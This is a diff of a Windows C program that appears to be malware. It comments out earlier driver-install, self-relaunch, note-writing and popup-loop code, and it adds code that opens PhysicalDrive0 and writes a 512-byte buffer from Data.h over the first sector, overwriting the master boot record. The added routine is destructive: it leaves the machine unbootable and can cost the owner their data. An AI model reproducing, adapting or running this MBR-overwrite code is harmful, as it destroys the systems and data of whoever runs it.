@@ -1,4 +1,5 @@
 #include "Utils.h"
+#include "Data.h"
 
 #define ARG L"monitorproc"
 
@@ -30,7 +31,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	char pid[32] = { 0 };
 	sprintf_s(pid, 32, "%lu", GetCurrentProcessId());
 
-	HANDLE device = install_driver();
+	/*HANDLE device = install_driver();
 
 	ULONG bytesReturned;
 
@@ -49,31 +50,52 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 			NULL
 		);
 	
-	CloseHandle(device);
+	CloseHandle(device);*/
 
 	int argc;
 
 	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
-	if (argc == 1 || lstrcmpW(argv[1], ARG)) {
+	//if (argc == 1 || lstrcmpW(argv[1], ARG)) {
 
-		CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
+	//	//CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
 
-		LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
-		GetModuleFileName(NULL, procn, MAX_PATH * 2);
+	//	LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
+	//	GetModuleFileName(NULL, procn, MAX_PATH * 2);
 
-		ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
+	//	ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
+
+	//	monitor();
+
+	//	return;
+	//}
+
+	//monitor();
+
+	HANDLE mbr = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+
+	DWORD rbytes;
+
+	if (!WriteFile(mbr, code, 512, &rbytes, NULL)) {
+		printError();
 	}
+	
+	CloseHandle(mbr);
+	
 
-	monitor();
 
-	createNote(".\\note.txt", "WOowoowowooOOWoWOo", TRUE);
 
-	for (;;) {
 
-		popup("Lol", "Hello!");
-		Sleep(10000);
-	}
+	//createNote(".\\note.txt", "WOowoowowooOOWoWOo", TRUE);
+
+
+
+
+	//for (;;) {
+	//	 
+	//	popup("Lol", "Hello!");
+	//	Sleep(10000);
+	//}
 	return 0;
 }
 
